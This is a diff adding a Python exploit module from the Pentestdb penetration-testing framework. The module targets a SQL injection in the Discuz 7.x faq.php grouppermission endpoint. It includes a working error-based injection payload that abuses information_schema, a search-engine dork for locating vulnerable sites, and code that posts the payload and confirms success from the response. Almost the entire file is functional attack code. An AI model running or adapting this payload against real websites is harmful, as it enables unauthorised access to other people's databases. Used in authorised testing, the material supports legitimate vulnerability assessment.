@@ -1,0 +1,43 @@
+#!/usr/bin/env python
+#-*- coding:utf-8 -*-
+
+'''
+Pentestdb, a database for penetration test.
+Copyright (c) 2015 alpha1e0
+'''
+
+
+from script.libs.exploit import Exploit
+from script.libs.exploit import Result
+
+
+
+class DiscuzSI(Exploit):
+    expName = u"Discuz 7 faq.php grouppermission SQL注入"
+    version = "1.0"
+    author = "alpha1e0"
+    language = "php"
+    appName = "discuz"
+    appVersion = "7.x"
+    reference = ['http://www.wooyun.org/bugs/wooyun-2014-066095']
+    description = u'''
+        漏洞利用条件：1.Discuz 7.x
+        gh: inurl:faq.php?action=grouppermission
+    '''
+
+    def _verify(self):
+        result = Result(self)
+
+        sig = '2c1743a391305fbf367df8e4f069f9f9'
+        payload = {"gids[66]":"'", "gids[88][0]":") and (select 1 from (select count(*),concat({0},floor(rand(0)*2))x from information_schema.tables group by x)a)#".format(sig)}
+        
+        url = self.url if "faq.php" in self.url else self.baseURL+"/faq.php?action=grouppermission"
+        response = self.http.post(url, data=payload)
+
+        if response.status_code==200:
+            if sig in response.content and "SQL" in response.content:
+                result['fullpath'] = url
+                result['payload'] = "Post:"+response.request.body
+
+        return result
+
